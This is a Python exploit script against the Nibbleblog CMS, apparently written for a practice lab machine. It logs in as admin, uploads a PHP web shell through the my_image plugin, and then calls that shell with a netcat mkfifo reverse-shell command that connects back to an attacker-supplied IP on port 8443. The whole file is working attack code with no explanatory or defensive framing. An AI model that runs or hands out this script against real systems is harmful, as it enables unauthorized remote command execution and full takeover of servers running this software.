import urllib.parse
import requests
import argparse


def login(session, url, user, password):
    login_url = f"{url}admin.php"
    session.get(login_url)
    login_post_resp = session.post(login_url, data={'username': {user}, 'password': {password}})
    if 'Incorrect username or password.' in login_post_resp.text:
        print('[!] Login Failed.')
        return False
    else:
        print('[+] Login Successful.')
        return True


def upload_shell(session, url):
    upload_url = f"{url}admin.php?controller=plugins&action=config&plugin=my_image"
    upload_post_resp = session.post(upload_url,
                                    data={'plugin': 'my_image', 'title': 'My image', 'position': '4',
                                          'caption': 'caption',
                                          'image_resize': '1', 'image_width': '230', 'image_height': '200',
                                          'image_option': 'auto'},
                                    files={
                                        'image': ('nibbles.php', "<?php system($_GET['cmd']);?>", 'application/x-php')},
                                    timeout=30)
    if '<b>Warning</b>' in upload_post_resp.text:
        print('[+] Upload likely successful.')
    else:
        print('[-] Upload likely failed.')


def execute_shell(session, url, ip):
    exploit_url = f"{url}content/private/plugins/my_image/image.php?cmd=" + urllib.parse.quote(
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} 8443 >/tmp/f")
    print('[+] Exploit launched, check for shell on port 8443.')
    session.get(exploit_url)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-l', required=True, help="URL of the target")
    parser.add_argument('--ip', '-ip', required=True, help="IP for the reverse shell")
    parser.add_argument('--user', '-u', required=True, help="User name of the admin")
    parser.add_argument('--password', '-p', required=True, help="Password for the admin user")
    args = parser.parse_args()

    session = requests.Session()
    login(session, args.url, args.user, args.password)
    upload_shell(session, args.url)
    execute_shell(session, args.url, args.ip)


if __name__ == "__main__":
    main()
